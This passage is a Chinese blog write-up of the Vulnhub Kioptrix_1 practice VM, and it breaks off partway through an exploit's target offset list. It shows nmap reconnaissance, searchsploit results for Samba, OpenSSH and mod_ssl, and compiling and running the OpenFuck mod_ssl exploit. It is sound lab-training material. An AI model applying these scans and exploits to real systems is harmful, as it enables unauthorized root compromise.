@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub - Kioptrix_1 - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="靶机介绍 靶机地址 Kioptrix_1 靶机描述 This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/2020-07-29-vulnhub-kioptrix-1/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub - Kioptrix_1" />
+<meta property="og:description" content="靶机介绍 靶机地址 Kioptrix_1 靶机描述 This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/2020-07-29-vulnhub-kioptrix-1/" />
+<meta property="article:published_time" content="2020-07-29T10:11:50+00:00" />
+<meta property="article:modified_time" content="2020-07-29T10:11:50+00:00" />
+<meta itemprop="name" content="Vulnhub - Kioptrix_1">
+<meta itemprop="description" content="靶机介绍 靶机地址 Kioptrix_1 靶机描述 This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the">
+<meta itemprop="datePublished" content="2020-07-29T10:11:50+00:00" />
+<meta itemprop="dateModified" content="2020-07-29T10:11:50+00:00" />
+<meta itemprop="wordCount" content="2916">
+
+
+
+<meta itemprop="keywords" content="Vulnhub," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub - Kioptrix_1"/>
+<meta name="twitter:description" content="靶机介绍 靶机地址 Kioptrix_1 靶机描述 This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Even</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Even</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub - Kioptrix_1</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-07-29 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#靶机介绍">靶机介绍</a>
+          <ul>
+            <li><a href="#靶机地址">靶机地址</a></li>
+            <li><a href="#靶机描述">靶机描述</a></li>
+            <li><a href="#导入靶机">导入靶机</a></li>
+          </ul>
+        </li>
+        <li><a href="#信息收集">信息收集</a>
+          <ul>
+            <li><a href="#openssh-29p2">OpenSSH 2.9p2</a></li>
+            <li><a href="#apache-mod_ssl">Apache mod_ssl</a></li>
+            <li><a href="#samba">Samba</a></li>
+          </ul>
+        </li>
+        <li><a href="#漏洞利用">漏洞利用</a>
+          <ul>
+            <li><a href="#mod_ssl-利用">mod_ssl 利用</a></li>
+            <li><a href="#samba-利用">Samba 利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#参考链接">参考链接</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="靶机介绍">靶机介绍</h2>
+<h3 id="靶机地址">靶机地址</h3>
+<p><a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix_1</a></p>
+<h3 id="靶机描述">靶机描述</h3>
+<p>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
+<p>Source: <a href="http://www.kioptrix.com/blog/?page_id=135">http://www.kioptrix.com/blog/?page_id=135</a></p>
+<p>Source: <a href="http://www.kioptrix.com/blog/?p=49">http://www.kioptrix.com/blog/?p=49</a></p>
+<h3 id="导入靶机">导入靶机</h3>
+<p>该靶机是基于 VMware 的，并没有导出为 OVF，但是我使用的 Virtualbox。通过搜索发现 VMware 官方提供 <a href="https://www.vmware.com/support/developer/ovf/"><strong>ovftool</strong></a>，可以在不安装 VMware Player / Workstation 的情况下方便地进行格式转换。这里我将 vmx 转换成 ovf:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ovftool &lt;vm.vmx&gt; &lt;vm.ovf&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>最后使用 Virtualbox 导入 OVF 文件即可。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>首先确定靶机的 IP 地址，这里我选择使用 <strong>nmap</strong> 进行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sn 192.168.56.0/24
+
+Nmap scan report <span class="k">for</span> 192.168.56.109
+Host is up <span class="o">(</span>0.0019s latency<span class="o">)</span>.
+</code></pre></td></tr></table>
+</div>
+</div><p>得到 IP 地址为 <strong>192.168.56.109</strong>。接着进行端口扫描和服务识别，同样使用 nmap：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV -p- -T4 -O 192.168.56.109
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-07-28/nmap.webp" alt="nmap结果"></p>
+<p>可见开放了 22、80、139、443 和 1024 这几个端口，以及从这张图中能看出所运行的服务的版本和大致的操作系统信息。下面将从这些信息入手寻找弱点信息。</p>
+<h3 id="openssh-29p2">OpenSSH 2.9p2</h3>
+<p>首先在本地的漏洞信息库中搜索，使用以下命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">searchsploit OpenSSH 2.9
+</code></pre></td></tr></table>
+</div>
+</div><p>其中有两条结果比较有趣，如下图所示：</p>
+<p><img src="/images/2020-07-28/OpenSSH.webp" alt="OpenSSH"></p>
+<h3 id="apache-mod_ssl">Apache mod_ssl</h3>
+<p>这个一开始我还真的没有发现，只盯着 Apache 并没有得到有价值的信息。后续在 searchsploit 的结果中发现了 mod_ssl 模块存在漏洞，且版本符合。</p>
+<p><img src="/images/2020-07-28/mod_ssl.webp" alt="mod_ssl"></p>
+<h3 id="samba">Samba</h3>
+<p>Samba 令我头疼了很久，使用 enum4linux 工具进行扫描，但是并扫不出什么有用的信息，老是提示错误：<em>[E] Server doesn&rsquo;t allow session using username &lsquo;&rsquo;, password &lsquo;&rsquo;.  Aborting remainder of tests.</em> 查看 kali 的论坛也有相似的情况的，但是好像使用旧版本的 enum4linux 可以正常工作。exploit-db 上有关的 exp 倒是有很多：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">Samba 1.9.19 - &#39;Password&#39; Remote Buffer Overflow                                                                            | linux/remote/20308.c
+Samba 2.0.7 - SWAT Logfile Permissions                                                                                      | linux/local/20341.sh
+Samba 2.0.7 - SWAT Logging Failure                                                                                          | unix/remote/20340.c
+Samba 2.0.7 - SWAT Symlink (1)                                                                                              | linux/local/20338.c
+Samba 2.0.7 - SWAT Symlink (2)                                                                                              | linux/local/20339.sh
+Samba 2.0.x - Insecure TMP File Symbolic Link                                                                               | linux/local/20776.c
+Samba 2.0.x/2.2 - Arbitrary File Creation                                                                                   | unix/remote/20968.txt
+Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                | osx/remote/9924.rb
+Samba 2.2.2 &lt; 2.2.6 - &#39;nttrans&#39; Remote Buffer Overflow (Metasploit) (1)                                                     | linux/remote/16321.rb
+Samba 2.2.8 (BSD x86) - &#39;trans2open&#39; Remote Overflow (Metasploit)                                                           | bsd_x86/remote/16880.rb
+Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                             | linux/local/23674.txt
+Samba 2.2.8 (Linux x86) - &#39;trans2open&#39; Remote Overflow (Metasploit)                                                         | linux_x86/remote/16861.rb
+Samba 2.2.8 (OSX/PPC) - &#39;trans2open&#39; Remote Overflow (Metasploit)                                                           | osx_ppc/remote/16876.rb
+Samba 2.2.8 (Solaris SPARC) - &#39;trans2open&#39; Remote Overflow (Metasploit)                                                     | solaris_sparc/remote/16330.rb
+Samba 2.2.8 - Brute Force Method Remote Command Execution                                                                   | linux/remote/55.c
+Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (1)                                                                  | unix/remote/22468.c
+Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (2)                                                                  | unix/remote/22469.c
+Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (3)                                                                  | unix/remote/22470.c
+Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (4)                                                                  | unix/remote/22471.txt
+Samba 2.2.x - &#39;nttrans&#39; Remote Overflow (Metasploit)                                                                        | linux/remote/9936.rb
+Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                     | unix/remote/22356.c
+Samba 2.2.x - Remote Buffer Overflow                                                                                        | linux/remote/7.pl
+Samba 3.0.10 (OSX) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                                                        | osx/remote/16875.rb
+Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                                                      | multiple/remote/10095.txt
+Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)                                            | unix/remote/16320.rb
+Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                          | linux/remote/9950.rb
+Samba 3.0.24 (Linux) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                                                      | linux/remote/16859.rb
+Samba 3.0.24 (Solaris) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                                                    | solaris/remote/16329.rb
+Samba 3.0.27a - &#39;send_mailslot()&#39; Remote Buffer Overflow                                                                    | linux/dos/4732.c
+Samba 3.0.29 (Client) - &#39;receive_smb_raw()&#39; Buffer Overflow (PoC)                                                           | multiple/dos/5712.pl
+Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                            | linux/remote/364.pl
+Samba 3.3.12 (Linux x86) - &#39;chain_reply&#39; Memory Corruption (Metasploit)                                                     | linux_x86/remote/16860.rb
+Samba 3.3.5 - Format String / Security Bypass                                                                               | linux/remote/33053.txt
+Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                 | linux/remote/21850.rb
+Samba 3.4.5 - Symlink Directory Traversal                                                                                   | linux/remote/33599.txt
+Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                      | linux/remote/33598.rb
+Samba 3.4.7/3.5.1 - Denial of Service                                                                                       | linux/dos/12588.txt
+Samba 3.5.0 - Remote Code Execution                                                                                         | linux/remote/42060.py
+Samba 3.5.0 &lt; 4.4.14/4.5.10/4.6.4 - &#39;is_known_pipename()&#39; Arbitrary Module Load (Metasploit)                                | linux/remote/42084.rb
+Samba 3.5.11/3.6.3 - Remote Code Execution                                                                                  | linux/remote/37834.py
+Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                                  | linux/dos/27778.txt
+Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory                                                    | multiple/remote/41740.txt
+Samba &lt; 2.0.5 - Local Overflow                                                                                              | linux/local/19428.c
+Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                                                                           | multiple/remote/10.c
+Samba &lt; 3.0.20 - Remote Heap Overflow                                                                                       | linux/remote/7701.txt
+Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                               | linux_x86/dos/36741.py
+te/22434.txt
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞利用">漏洞利用</h2>
+<p>根据以上的扫描结果，OpenSSH 的利用比较失败，msf 并没有现成的利用工具，而 exploit-db 的 exp 无法通过编译，经过几番的尝试最终无果。而 Samba 并没有收集到足够的信息，连最起码的服务版本都没有的到，只能参考了其他人的博客，得知了 Samba 服务的版本为 2.2.1a。</p>
+<h3 id="mod_ssl-利用">mod_ssl 利用</h3>
+<p>如之前的图所示，exploit-db 上相关的 exp 有 3 个，经过一番查看，它们的功能应该是相同的。其中 <strong>21671.c</strong> 和 <strong>764.c</strong> 是无法通过编译的,所以直接使用 <strong>47080.c</strong> 即可，编译命令如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">gcc 47080.c -o exp -lcrypto
+</code></pre></td></tr></table>
+</div>
+</div><p>接着运行 exp，出现帮助菜单，进行查看：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">*******************************************************************
+* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* <span class="c1">#hackarena  irc.brasnet.org                                     *</span>
+* TNX Xanthic USG <span class="c1">#SilverLords #BloodBR #isotk #highsecure #uname *</span>
+* <span class="c1">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
+* <span class="c1">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span>
+*******************************************************************
+
+: Usage: ./exp target box <span class="o">[</span>port<span class="o">]</span> <span class="o">[</span>-c N<span class="o">]</span>
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port <span class="k">for</span> ssl connection
+  -c open N connections. <span class="o">(</span>use range 40-50 <span class="k">if</span> u dont know<span class="o">)</span>
+  
+
+  Supported OffSet:
+	0x00 - Caldera OpenLinux <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x01 - Cobalt Sun 6.0 <span class="o">(</span>apache-1.3.12<span class="o">)</span>
+	0x02 - Cobalt Sun 6.0 <span class="o">(</span>apache-1.3.20<span class="o">)</span>
+	0x03 - Cobalt Sun x <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x04 - Cobalt Sun x Fixed2 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x05 - Conectiva <span class="m">4</span> <span class="o">(</span>apache-1.3.6<span class="o">)</span>
+	0x06 - Conectiva 4.1 <span class="o">(</span>apache-1.3.9<span class="o">)</span>
+	0x07 - Conectiva <span class="m">6</span> <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+	0x08 - Conectiva <span class="m">7</span> <span class="o">(</span>apache-1.3.12<span class="o">)</span>
+	0x09 - Conectiva <span class="m">7</span> <span class="o">(</span>apache-1.3.19<span class="o">)</span>
+	0x0a - Conectiva 7/8 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x0b - Conectiva <span class="m">8</span> <span class="o">(</span>apache-1.3.22<span class="o">)</span>
+	0x0c - Debian GNU Linux 2.2 Potato <span class="o">(</span>apache_1.3.9-14.1<span class="o">)</span>
+	0x0d - Debian GNU Linux <span class="o">(</span>apache_1.3.19-1<span class="o">)</span>
+	0x0e - Debian GNU Linux <span class="o">(</span>apache_1.3.22-2<span class="o">)</span>
+	0x0f - Debian GNU Linux <span class="o">(</span>apache-1.3.22-2.1<span class="o">)</span>
+	0x10 - Debian GNU Linux <span class="o">(</span>apache-1.3.22-5<span class="o">)</span>
+	0x11 - Debian GNU Linux <span class="o">(</span>apache_1.3.23-1<span class="o">)</span>
+	0x12 - Debian GNU Linux <span class="o">(</span>apache_1.3.24-2.1<span class="o">)</span>
+	0x13 - Debian Linux GNU Linux <span class="m">2</span> <span class="o">(</span>apache_1.3.24-2.1<span class="o">)</span>
+	0x14 - Debian GNU Linux <span class="o">(</span>apache_1.3.24-3<span class="o">)</span>
+	0x15 - Debian GNU Linux <span class="o">(</span>apache-1.3.26-1<span class="o">)</span>
+	0x16 - Debian GNU Linux 3.0 Woody <span class="o">(</span>apache-1.3.26-1<span class="o">)</span>
+	0x17 - Debian GNU Linux <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+	0x18 - FreeBSD <span class="o">(</span>apache-1.3.9<span class="o">)</span>
+	0x19 - FreeBSD <span class="o">(</span>apache-1.3.11<span class="o">)</span>
+	0x1a - FreeBSD <span class="o">(</span>apache-1.3.12.1.40<span class="o">)</span>
+	0x1b - FreeBSD <span class="o">(</span>apache-1.3.12.1.40<span class="o">)</span>
+	0x1c - FreeBSD <span class="o">(</span>apache-1.3.12.1.40<span class="o">)</span>
+	0x1d - FreeBSD <span class="o">(</span>apache-1.3.12.1.40_1<span class="o">)</span>
+	0x1e - FreeBSD <span class="o">(</span>apache-1.3.12<span class="o">)</span>
+	0x1f - FreeBSD <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+	0x20 - FreeBSD <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+	0x21 - FreeBSD <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+	0x22 - FreeBSD <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+	0x23 - FreeBSD <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+	0x24 - FreeBSD <span class="o">(</span>apache-1.3.17_1<span class="o">)</span>
+	0x25 - FreeBSD <span class="o">(</span>apache-1.3.19<span class="o">)</span>
+	0x26 - FreeBSD <span class="o">(</span>apache-1.3.19_1<span class="o">)</span>
+	0x27 - FreeBSD <span class="o">(</span>apache-1.3.20<span class="o">)</span>
+	0x28 - FreeBSD <span class="o">(</span>apache-1.3.20<span class="o">)</span>
+	0x29 - FreeBSD <span class="o">(</span>apache-1.3.20+2.8.4<span class="o">)</span>
+	0x2a - FreeBSD <span class="o">(</span>apache-1.3.20_1<span class="o">)</span>
+	0x2b - FreeBSD <span class="o">(</span>apache-1.3.22<span class="o">)</span>
+	0x2c - FreeBSD <span class="o">(</span>apache-1.3.22_7<span class="o">)</span>
+	0x2d - FreeBSD <span class="o">(</span>apache_fp-1.3.23<span class="o">)</span>
+	0x2e - FreeBSD <span class="o">(</span>apache-1.3.24_7<span class="o">)</span>
+	0x2f - FreeBSD <span class="o">(</span>apache-1.3.24+2.8.8<span class="o">)</span>
+	0x30 - FreeBSD 4.6.2-Release-p6 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x31 - FreeBSD 4.6-Realease <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x32 - FreeBSD <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+	0x33 - Gentoo Linux <span class="o">(</span>apache-1.3.24-r2<span class="o">)</span>
+	0x34 - Linux Generic <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+	0x35 - Mandrake Linux X.x <span class="o">(</span>apache-1.3.22-10.1mdk<span class="o">)</span>
+	0x36 - Mandrake Linux 7.1 <span class="o">(</span>apache-1.3.14-2<span class="o">)</span>
+	0x37 - Mandrake Linux 7.1 <span class="o">(</span>apache-1.3.22-1.4mdk<span class="o">)</span>
+	0x38 - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.14-2mdk<span class="o">)</span>
+	0x39 - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.14<span class="o">)</span> <span class="m">2</span>
+	0x3a - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.20-5.1mdk<span class="o">)</span>
+	0x3b - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.20-5.2mdk<span class="o">)</span>
